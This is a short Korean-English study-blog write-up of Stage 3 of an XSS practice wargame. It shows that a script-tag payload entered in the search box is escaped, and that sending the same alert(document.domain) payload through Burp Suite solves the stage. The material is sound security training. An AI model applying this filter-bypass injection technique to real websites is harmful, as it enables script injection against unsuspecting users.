---
layout: default
title: Week 2-1 XSS Challenges Stage 3
parent: Wargame
grand_parent: Study
nav_order: 1
mathjax: true
mermaid: true
permalink: /docs/wargame/week2-1
---

# Week 2-1 XSS Challenges Stage #3
{: .no_toc }

<details markdown="block">
  <summary>
	Table of contents
  </summary>
{: .fs-3 .text-delta }
- TOC
{:toc}
</details>

---

> [XSS Challenges Stage #3](http://xss-quiz.int21h.jp/stage-3.php?)

## XSS Challenges Stage #3

### Description

- What you have to do:

	- Inject the following JavaScript command: `alert(document.domain)`;

## Solving

### 관찰

<center markdown="block">
![main-page](/assets/wargame/images/2-1-main-page.png)

Main page
</center>

##### tokyo 검색

<center markdown="block">
![tokyo-search](/assets/wargame/images/2-1-tokyo-search.png)

Response page
</center>

```html
<!-- Response code -->
...
We couldn't find any places called
<b>"tokyo"</b>
in
<b>Japan</b>
.
...
```

### Step 1

- 주입할 코드로 검색

	```html
	<script>alert(document.domain);</script>
	```

<center markdown="block">
![code-search](/assets/wargame/images/2-1-code-search.png)

Response page
</center>

```html
<!-- Response code -->
...
We couldn't find any places called
<b>"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</b>
in
<b>Japan</b>
.
...
```

- 입력은 방어되어 있는 듯 하다.

### Step 2

- HTTP reponse message에 주입

	- burpsuite 이용

	```html
	<script>alert(document.domain);</script>
	```

<center markdown="block">
![solve](/assets/wargame/images/2-1-solve.png)

Solve page
</center>
